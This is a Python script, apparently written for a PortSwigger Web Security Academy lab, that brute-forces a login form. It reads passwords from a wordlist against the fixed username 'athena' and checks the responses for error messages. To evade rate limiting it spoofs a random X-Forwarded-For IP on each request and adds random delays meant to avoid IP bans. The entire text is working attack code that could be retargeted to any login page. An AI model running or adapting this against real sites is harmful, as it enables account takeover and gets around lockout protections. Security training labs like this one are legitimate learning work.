import requests
import random
import time

# Target URLs and Wordlists
login_url = "https://0a4600cc03eb61aa854421bc00cf0075.web-security-academy.net/login"  # Replace with the actual login URL of the lab
usernames_file = "usernames.txt"  # File containing candidate usernames
passwords_file = "passwords.txt"  # File containing candidate passwords

# Function to generate random valid IP addresses
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Function to try logins and check for error messages
def try_login(username, password):
    # Replace these data keys based on the actual login form fields
    data = {
        "username": username,
        "password": password
    }
    
    # Set headers with rotating IP
    headers = {
        "X-Forwarded-For": generate_random_ip(),
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36"
    }

    # Send POST request with a session reset each time
    with requests.Session() as session:
        response = session.post(login_url, data=data, headers=headers)
    
    # Check for success or any distinctive error message
    if "Invalid username" not in response.text and "Incorrect password" not in response.text:
        return response.text
    return None

# Step 1: Enumerate Valid Username
valid_username = "athena"  # Assume you found the valid username

# Step 2: Brute-force the Password
print("Brute-forcing the password...")

valid_password = None

# Open password wordlist and test each password for the valid username
with open(passwords_file, "r") as file:
    for password in file:
        password = password.strip()
        print(f"Trying password: {password}")

        # Attempt login with the valid username and current password
        response = try_login(valid_username, password)

        # Check if the response indicates a successful login
        if response:
            print(f"Valid password found: {password}")
            valid_password = password
            break

        # Introduce delay to avoid IP bans
        time.sleep(random.uniform(1, 3))  # Random delay between 1 to 3 seconds

if not valid_password:
    print("Password brute-forcing failed. Exiting.")
